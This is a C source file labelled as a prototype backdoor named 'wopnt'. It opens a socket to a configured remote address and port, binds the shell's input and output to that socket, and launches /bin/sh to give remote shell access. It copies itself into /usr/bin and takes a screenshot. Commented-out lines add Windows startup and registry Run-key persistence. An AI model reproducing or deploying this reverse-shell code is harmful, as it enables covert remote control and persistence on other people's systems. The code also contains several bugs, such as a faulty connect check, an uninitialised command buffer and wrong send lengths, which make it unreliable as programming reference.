/* prototype of backdoor wopnt. */ 

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define remote_addr "127.0.0.1"

#define remote_port 443

#define false 0
#define true 1
#define bytes 4096

  void
  shell_killer()

  {

    int x, root;
    struct sockaddr_in s;
    char cmd[bytes];
    memset(s.sin_zero, '\0', sizeof s.sin_zero);
    s.sin_family = AF_INET;
    s.sin_addr.s_addr = inet_addr(remote_addr);
    s.sin_port = htons(remote_port);


    x = socket(AF_INET, SOCK_STREAM, 0);

    connect(x, (struct sockaddr *)&s, sizeof(s));
    if(connect == false) {
    perror("connect_socket(CONNECT_STABILISHED)failed");
    }
    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0) {
    perror("setsockopt(SO_REUSEADDR) failed");
    }

     root = popen(cmd,"r");
    /* mm a for loop will be necessary, or switch case. */


    dup2(x, 0),dup2(x, 1),dup2(x, 2);
    root = system("cp simple_shell /usr/bin"); /* here the code will execute in the target machine
                                             the following command. Will copy the software to
                                             register, on linux systems.

                                             Same here... */
    //system("ufw enable");
    system("xwd -root -out myshot.xwd");
    //chdir("/");
    //system("copy /Y simple_shell.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar");
    //system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wopnt.exe");
    send(x,"\n\n[*] Copied into start up [*]\n\n",32,0);

    send(x,"\n\n\[*] Copied into registry [*]\n\n",31,0);

    send(x,"\n\n[*] Firewall disabled [*]\n\n",27,0);

    send(x,"\n\n[*] Screenshot saved in Desktop [*]\n\n",38,0);

    send(x,"\nConnecting payload...\n",24,0);
    sleep(5);
    //if((x=recv(x,cmd,sizeof (cmd),0 ) == "/INIT"))
    send(x,"\n\n#root > \n\n",10,0);   /* recv(); no lado controller. */
    //else
    do {
    root = execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);

    {

    return shell_killer();

    }

   }

    while(1);


} 
    /* execute the program */

   int main(int argc, char **argv)

   {
     char option;

     //printf("\nLaunch the shell\n");
     //scanf("%s",&option);
     //printf("%s",&option);

     option = 's'; //allready determined the answer ;)

     switch(option)

     {

      case 's':

           shell_killer();


    }




}
